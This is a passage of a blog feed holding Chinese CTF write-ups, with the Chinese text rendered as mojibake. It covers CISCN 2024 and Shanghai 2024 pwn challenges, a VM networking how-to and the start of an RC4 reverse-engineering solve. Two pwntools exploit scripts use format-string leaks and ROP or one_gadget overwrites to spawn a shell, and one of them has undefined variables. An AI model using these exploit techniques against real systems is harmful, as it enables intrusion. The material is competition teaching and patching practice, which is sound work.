class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import *</span><br><br>filename=<span class="hljs-string">&#x27;./&#x27;</span><br>elf = ELF(filename)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>context(arch = elf.arch,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>debug = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> debug:<br>    io = process(filename)<br><span class="hljs-keyword">else</span>:<br>    io = remote(<span class="hljs-string">&#x27;node5.anna.nssctf.cn&#x27;</span>,<span class="hljs-number">21565</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>) : io.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>) : io.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>) : io.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>) : io.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>() : <span class="hljs-built_in">print</span>(io.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ru</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> io.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>() : io.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(io)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">b</span>(<span class="hljs-params">addr</span>):    <br>    <span class="hljs-comment">#bk=&quot;b *$rebase(&quot;+str(addr)+&quot;)&quot;    </span><br>    bk=<span class="hljs-string">&#x27;b *&#x27;</span> + <span class="hljs-built_in">str</span>(addr)    <br>    attach(io,bk)  <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr_32</span>():<br>    <span class="hljs-keyword">return</span> u32(io.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_sb</span>():<br>    <span class="hljs-keyword">return</span> libc_base + libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>], libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>))    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">d</span>(<span class="hljs-params">idx</span>):<br>    sla(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">tp, content,aa</span>):<br>    d(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&quot;name:&quot;</span>,<span class="hljs-built_in">str</span>(tp))<br>    sla(<span class="hljs-string">b&#x27;len:&#x27;</span>, <span class="hljs-built_in">str</span>(content))<br>    sla(<span class="hljs-string">&quot;data:&quot;</span>,aa)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">index</span>):<br>    d(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&quot;name:&quot;</span>,(index)<br><br>sla(<span class="hljs-string">&quot;size:&quot;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">0x88</span>))<br>sla(<span class="hljs-string">&quot;Json:&quot;</span>,<span class="hljs-string">b&#x27;44&#x27;</span>)<br><br>free(<span class="hljs-string">&quot;%25$p&quot;</span>)<br>rl(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary = <span class="hljs-built_in">int</span>(r(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>info(<span class="hljs-built_in">hex</span>(can))<br>free(<span class="hljs-string">&quot;%27$p&quot;</span>)<br>rl(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_base=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">0x24083</span><br>info(<span class="hljs-built_in">hex</span>(base))<br>pop_rdi = <span class="hljs-number">0x23b6a</span>+libc_base<br>system,bin_sh=get_addr()<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">632</span>+p64(canary)*<span class="hljs-number">2</span>+p64(pop_rdi)+p64(bin_sh)+p64(system))<br><br>inter()<br></code></pre></td></tr></table></figure><p>æ­£å¸¸æ€è·¯æ˜¯åŠ«æŒret_addræ”¹ä¸ºone_gadget</p><p>åç§»22å¤„ä¸€èˆ¬æ˜¾ç¤ºä¸å‡ºæ¥æŒ‡é’ˆé“¾ï¼Œä½†å¯ä»¥çŒœ</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741706650100-5c4f4f1a-fe35-46ac-a838-96095d512bd8.png" class="" title="img"><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741706700609-c09a56ed-e1c1-4bc8-a568-8ab491b4b879.png" class="" title="img"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>FILENAME=<span class="hljs-string">&#x27;./jason&#x27;</span><br>p= process(FILENAME)<br>libc=ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">name</span>):<br>    p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>    p.sendline(<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;name&#x27;</span>)<br>    p.sendline(name)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;size&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;20&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;Json&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;21&#x27;</span>)<br>show(<span class="hljs-string">b&#x27;%27$p%10$p&#x27;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_add=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">6</span>*<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)<br>libcbase=libc_add-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]-<span class="hljs-number">243</span><br>success(<span class="hljs-string">&#x27;libcbase &#x27;</span>+<span class="hljs-built_in">hex</span>(libcbase))<br>one_gadget=[<span class="hljs-number">0xe3afe</span>,<span class="hljs-number">0xe3b01</span>,<span class="hljs-number">0xe3b04</span>]<br>execve=libcbase+one_gadget[<span class="hljs-number">1</span>]<br>success(<span class="hljs-string">&#x27;execve &#x27;</span>+<span class="hljs-built_in">hex</span>(execve))<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>stack_add=<span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">6</span>*<span class="hljs-number">2</span>),<span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;stack_add &#x27;</span>+<span class="hljs-built_in">hex</span>(stack_add))<br><br><br>stack_add+=<span class="hljs-number">0x8</span><br>f=execve&amp;<span class="hljs-number">0xffff</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(f),<span class="hljs-string">&#x27;utf-8&#x27;</span>)+<span class="hljs-string">b&#x27;c%22$hn&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(stack_add)<br><br>show(payload)<br><br><br><br>f=(execve&gt;&gt;(<span class="hljs-number">2</span>*<span class="hljs-number">8</span>))&amp;<span class="hljs-number">0xff</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(f))<br>payload=<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(f),<span class="hljs-string">&#x27;utf-8&#x27;</span>)+<span class="hljs-string">b&#x27;c%22$hhn&#x27;</span><br>payload=payload.ljust(<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(stack_add+<span class="hljs-number">2</span>)<br><br>show(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;&gt;&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;name&#x27;</span>)<br>p.sendline(<span class="hljs-string">b&#x27;d&#x27;</span>)<span class="hljs-comment">#è¯»ä¸€ä¸ªä¸å­˜åœ¨çš„nameé€€å‡ºå³å¯</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="ezwp-1"><a href="#ezwp-1" class="headerlink" title="ezwp-1"></a>ezwp-1</h1><p>æ ¹æ®å­—ç¬¦ä¸²æ‰¾åˆ°å…³é”®ä»£ç </p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741741035190-e193f6b1-91d6-4c9b-a685-f2be0c2d128c.png" class="" title="img"><p>è¿™é‡Œä¼šé€ æˆå•å­—èŠ‚æº¢å‡ºï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¾“å…¥çš„è¶…è¿‡0xffï¼Œä¾‹å¦‚0x100å°†ä¼šå¼ºåˆ¶è½¬åŒ–æˆ0ï¼Œè¿™ä¸ªæ—¶å€™èƒ½é€šè¿‡æ¯”è¾ƒï¼Œè€Œä¸‹é¢çš„å¯†ç æ¯”è¾ƒåªæ¯”è¾ƒ0x20ï¼Œä¹Ÿå°±èƒ½æˆåŠŸç»•è¿‡</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741741053667-d7da3698-605a-4523-8cfb-6b13b4e71b75.png" class="" title="img"><p>fixæ€è·¯æ˜¯æŠŠbyteæ”¹æˆwordï¼Œä½†æ˜¯ä¼šå¢åŠ å­—é•¿ï¼Œæœªå¿…èƒ½ä¿®ï¼Œæˆ–è€…ç›´æ¥æŠŠå­—ç¬¦ä¸²æ”¹äº†</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741780060827-28f3c496-a812-4091-bcbd-90720e9a20da.png" class="" title="img"><p>åé¢ç¯å¢ƒæ²¡äº†å°±æ‰¾ä¸åˆ°äº†</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741740656191-c0efb467-e969-40dd-9164-832fd6781871.png" class="" title="img"><h1 id="printf-master-3"><a href="#printf-master-3" class="headerlink" title="printf-master-3"></a>printf-master-3</h1><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1719300594895-4d0af2a1-ab4b-4a3c-89d6-6da8695405e9.png" class="" title="img"><p>æœ‰éæ ˆä¸Šæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1719299969800-35ba78e8-798e-4900-aee1-b239e8306aa4.png" class="" title="img"><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741851156490-ff8ec8aa-a0a9-47ba-90ef-f07c5ad80243.png" class="" title="img"><p>printfæ”¹putsçš„åšæ³•</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741851236352-43482b40-eb6e-4ee6-a47e-4ce74c53316f.png" class="" title="img"><p>æ³„éœ²å„ç§åœ°å€ï¼Œ#è¡¨ç¤ºè¿›åˆ¶å¸¦æ ¼å¼</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741852602706-89ea4f66-4717-4ce2-a691-4ac0f472ab2c.png" class="" title="img"><p>ç¦ç”¨$ï¼Œåˆ©ç”¨å †å å ä½ç¬¦å°±èƒ½è§£å†³</p><img src="/2024/06/30/CISCN2024%E5%8D%8E%E4%B8%9C%E5%8D%97%E5%88%86%E5%8C%BA%E8%B5%9Bpwn%E5%A4%8D%E7%8E%B0/1741852575357-4c81699d-b306-4ffc-a8dd-3ad30e3b3051.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>awdp_pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å®ç°ä¸¤å°è™šæ‹Ÿæœºç›¸äº’pingé€š</title>
    <link href="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/"/>
    <url>/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/</url>
    
    <content type="html"><![CDATA[<p>ä¸ºäº†ä½¿è™šæ‹Ÿæœºä¹‹é—´èƒ½å¤Ÿç›¸äº’pingé€šä¸”éƒ½èƒ½ä¸Šç½‘ï¼Œæ¯”è¾ƒå¿«çš„æ–¹æ³•æ˜¯è®¾ç½®ä¸€å¼ è™šæ‹Ÿç½‘å¡ï¼Œç„¶åè®©æ‰€æœ‰è™šæ‹Ÿæœºéƒ½ç”¨åŒä¸€å¼ ç½‘å¡ï¼Œè¿™æ ·ä¸åŒè™šæ‹Ÿæœºå°±åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘ä¸‹äº†</p><p>å…ˆæ‰“å¼€è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162827380.png" class="" title="image-20240623162827380"><p>è®¾ç½®ä¸€å¼ è™šæ‹Ÿç½‘å¡ä¸ºNATæ¨¡å¼ï¼Œå­ç½‘ipå¯ä»¥è‡ªå·±å®šä¹‰</p><p>åç»­è™šæ‹Ÿæœºéƒ½è¦é€‰æ‹©ä¸Šé¢çš„ç½‘å¡</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162529826.png" class="" title="image-20240623162529826"><p>ä¹‹åå…³é—­è™šæ‹Ÿæœº</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162755653.png" class="" title="image-20240623162755653"><p>ç‚¹å‡»ç¼–è¾‘è™šæ‹Ÿæœºè®¾ç½®ï¼Œé€‰æ‹©NATæ¨¡å¼</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162612160.png" class="" title="image-20240623162612160"><p>æˆ–è€…è‡ªå®šä¹‰é€‰æ‹©å¯¹åº”è™šæ‹Ÿç½‘å¡ï¼ˆè¿™æ—¶å€™ipä¼šä¸å®šæ—¶å˜åŠ¨ï¼‰</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623162733670.png" class="" title="image-20240623162733670"><p>å†æ‰“å¼€åº”è¯¥å°±èƒ½ç›¸äº’pingé€šäº†</p><p>ä¸€æ¬¡æ¸—é€æµ‹è¯•çš„æ—¶å€™ä¸»æœºpingä¸é€šé¶æœº(ä¸»æœºï¼škaliï¼Œé¶æœºwin_xp)</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163125519.png" class="" title="image-20240623163125519"><p>ä½†æ˜¯é¶æœºèƒ½pingä¸»æœº</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163157671.png" class="" title="image-20240623163157671"><p>è¿™æ—¶å€™éœ€è¦å…³é—­win_xpçš„é˜²ç«å¢™</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163320427.png" class="" title="image-20240623163320427"><p>å…³é—­ä¹‹åå°±å¯ä»¥æ­£å¸¸pingå•¦</p><img src="/2024/06/23/%E5%AE%9E%E7%8E%B0%E4%B8%A4%E5%8F%B0%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%9B%B8%E4%BA%92ping%E9%80%9A/image-20240623163356393.png" class="" title="image-20240623163356393">]]></content>
    
    
    <categories>
      
      <category>ç¯å¢ƒé…ç½®</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2024ä¸Šæµ·å¸‚èµ›å†³èµ›è®°å½•</title>
    <link href="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/"/>
    <url>/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<p>ä»Šå¤©çš„pwnå°±å±äºè¦ä¹ˆéƒ½åˆ«æƒ³æ‰“ï¼Œè¦ä¹ˆå¤§éƒ¨åˆ†äººéƒ½æ²¡ä¿®å¥½ï¼Œä¼šè¢«æ‰¹é‡æ‰“</p><h1 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h1><p>ä¸€ä¸Šæ¥ç›´æ¥æœå­—ç¬¦ä¸²ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰open(â€˜&#x2F;flagâ€™)æˆ–è€…systemè¿™ç§,ç›´æ¥æŠŠreadçš„å­—èŠ‚æ”¹å°ï¼Œè¿™æ ·ä¸€ç›´åˆ°20è½®ä¸¤é“pwnéƒ½æ²¡æœ‰è¢«æ‰“</p><img src="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/1717837104759-f21fb79d-b563-42e1-a33e-89805223589d-176328210010719.png" class="" title="img"><img src="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/1717835955103-aea717ac-ab2b-4970-af11-1e967d05fd55-176328210010721.png" class="" title="img"><p>åé¢è¢«æ‰“åˆå»çœ‹äº†ä¸€ä¸‹ï¼Œè§‰å¾—pwn1æ˜¯å…¸å‹çš„off by oneï¼Œåˆšå¥½å°§å“¥æ˜¨å¤©è®²è¿‡æ€ä¹ˆä¿®ï¼Œç›´æ¥å…¨éƒ¨nopå‘ç°å°±æ²¡è¢«æ‰“äº†ï¼Œä¹‹åå‘ç°flagè¿˜æ˜¯ä¼šè¢«readï¼Œä½†æ˜¯å› ä¸ºæå‰ä¿®æ”¹åªèƒ½è¯»ä¸€ä¸ªå­—èŠ‚</p><img src="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/1717836749041-9787fe8a-7090-4ad9-88cc-c2fab0c10037-176328210010825.png" class="" title="img"><p>åé¢åœ¨changeå †å—çš„æ—¶å€™å¤§äºæ‰breakï¼Œä¼šæœ‰è¶Šç•Œäº§ç”Ÿ</p><img src="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/1742179145014-5f093bd9-9af7-48f6-aff5-783e2c49dfb9-176328210010823.png" class="" title="img"><h1 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h1><img src="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/1717837104759-f21fb79d-b563-42e1-a33e-89805223589d-17632820619471.png" class="" title="img">åé¢pwn2æŒºé˜´é™©çš„ï¼Œå€’æ•°ç¬¬äºŒè½®æ‰æ‰“è¿›æ¥ï¼Œæœ€å¤§mallocæ˜¯0x4f+1<p>addå‡½æ•°æœ€å°ä¹Ÿæ˜¯0x4f+1ï¼Œè¿™ä¸ªæ—¶å€™ä¼šé€ æˆå †å ï¼Œä¿®çš„è¯æŠŠä¸Šé¢çš„å¤§äºæ¢æˆå¤§äºç­‰äºå°±è¡Œ</p><img src="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/1719924324662-967d47e1-3ba4-4750-bd5b-da8ccfc30edf-176328208294115.png" class="" title="img"><p>åé¢sprintfä¹Ÿæœ‰æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œåº”è¯¥è¦ç»™rsiä¼ %s</p><img src="/2024/06/18/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%86%B3%E8%B5%9B%E8%AE%B0%E5%BD%95/1742178743611-5cebca66-d6c2-486a-ae03-a619381c9220-176328208294117.png" class="" title="img">]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›wp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>awd_pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024ä¸Šæµ·å¸‚èµ›åˆèµ›éƒ¨åˆ†wp</title>
    <link href="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/"/>
    <url>/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/</url>
    
    <content type="html"><![CDATA[<p>ä¸­é€”æˆªçš„ä¸¤å¼ </p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716648634963-1eb42663-5133-4d7f-b417-8608dcbe8f33.png" class="" title="img"><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716624422591-b7db8b02-4f36-42c3-98bb-80d01da837ee.png" class="" title="img"><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="ez-re"><a href="#ez-re" class="headerlink" title="ez_re"></a>ez_re</h2><p>çœ‹ä¸€ä¸‹crazyå’Œohh</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603171319-f2529c89-e9b1-4427-bcf9-3f57ed4e908e.png" class="" title="img"><p>é€†å‘å¾—åˆ°fake flag</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603183325-dd6f2f91-460f-4d7c-a2af-6696384611f6.png" class="" title="img"><p>åé¢æœ‰è‡ªè§£å¯†</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603593551-2a159092-e376-4aec-a153-6fa8fa9f4104.png" class="" title="img"><p>è¿è¡Œåˆ°æœ€åä¸€ä¸ªæ–­ç‚¹åf7è¿›å…¥</p><p>å¼ºåˆ¶cï¼Œç„¶åp</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716604322919-137970f1-0202-4803-9368-411aff9e23ab.png" class="" title="img"><p>404040æ˜¯å¯†æ–‡</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603082521-c730d1aa-5d72-4a1c-a4fe-c1222a44cbfe.png" class="" title="img"><p>xxxæ˜æ˜¾æ˜¯rc4</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603126787-a478cc73-63c9-4f2b-8b72-472ff07fbd34.png" class="" title="img"><p>æå–å¯†æ–‡</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716603283906-646967f4-9e30-4075-b3ff-99fd22db8074.png" class="" title="img"><p>keyå°±æ˜¯å‰é¢çš„ä¼ªflag</p><img src="/2024/05/26/2024%E4%B8%8A%E6%B5%B7%E5%B8%82%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1716604463744-440f26c5-523b-4a90-8a0d-94ca0e75922c.png" class="" title="img"><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 